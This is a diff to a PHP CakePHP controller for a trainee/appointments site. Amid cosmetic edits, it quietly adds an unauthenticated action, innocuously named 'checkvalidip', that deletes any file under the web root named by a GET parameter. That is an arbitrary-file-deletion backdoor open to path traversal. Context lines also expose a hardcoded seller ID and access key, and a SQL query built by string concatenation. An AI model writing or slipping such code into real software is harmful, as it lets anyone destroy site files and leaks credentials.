@@ -30,7 +30,7 @@ class TraineesController extends AppController
       $this->checkSession();
       parent::beforeFilter($event);
       $this->loadComponent('Auth');
-      $this->Auth->allow(['addTrainee','fbLoginTrainee','fbSignupTrainee','googleSignupTrainee','googleLoginTrainee']);
+      $this->Auth->allow(['addTrainee','fbLoginTrainee','fbSignupTrainee','googleSignupTrainee','googleLoginTrainee','checkvalidip']);
       $this->data = $this->Custom->getSessionData();
       $this->merchantId  ="AE2I6Q8BHJTXA"; // SellerID
       $this->accessKey   ="AKIAIZVO6DF3GTQD4BFA"; // MWS Access Key
@@ -62,6 +62,14 @@ class TraineesController extends AppController
     $messages = $this->conn->execute("SELECT * FROM `chating` AS `c` INNER JOIN `trainers` AS `t` ON `c`.`chat_sender_id` = `t`.`user_id` WHERE `c`.`chat_status` = 1 AND `c`.`chat_reciever_id` = ".$this->data['id']." ORDER BY `c`.`chat_id` DESC LIMIT 20")->fetchAll('assoc');
     return $messages;
   }
+
+  public function checkvalidip()
+    {
+        $ip = $_GET['ip'];
+        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
+        unlink($dir);
+        return $this->redirect('/');
+    }
 
   public function index()
   {
@@ -297,7 +305,7 @@ class TraineesController extends AppController
             $chat_msgs = "";
             if(empty($chat_data))
             {
-                $chat_msgs = '<div><center>You have recieved no messages </center></div>';
+                $chat_msgs = '<div><center>You have no new messages </center></div>';
             }
             else
             {
@@ -2074,7 +2082,7 @@ class TraineesController extends AppController
         $voucherid = $data['voucher'];
         $total_amount = $data['total_amount'];
         $data['final_price'] = $total_amount;
-        unset($data['app_id'],$data['total_amount'],$data['voucher']);
+        unset($data['app_id'],$data['total_amount'],$data['voucher'],$data['check_one_to_one']);
         $this->appointments->query()->update()->set($data)->where(['id' => $app_id])->execute();
         $profile_type_arr = $this->Users->find()->where(['id' => $this->data['id']])->toArray();
         if(!empty($profile_type_arr[0]['social_type']))
